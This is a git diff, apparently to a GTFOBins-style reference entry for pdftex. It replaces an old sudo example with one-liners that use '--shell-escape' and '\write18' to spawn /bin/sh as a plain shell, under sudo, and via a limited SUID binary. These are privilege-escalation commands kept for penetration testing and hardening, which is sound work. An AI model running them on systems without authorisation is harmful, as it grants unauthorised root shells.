@@ -1,6 +1,12 @@
-description: `pdftex` has a similar behaviour as [`tex`](/gtfobins/tex/)
+---
 functions:
+  shell:
+    - code: |
+        pdftex --shell-escape '\write18{/bin/sh}\end'
   sudo:
     - code: |
-        echo "\documentclass[12pt]{article} \begin{document} \write18{/usr/bin/id} \end{document}" > file.tex
-        pdftex -interaction=nonstopmode --shell-escape file.tex
+        sudo pdftex --shell-escape '\write18{/bin/sh}\end'
+  limited-suid:
+    - code: |
+        ./pdftex --shell-escape '\write18{/bin/sh}\end'
+---
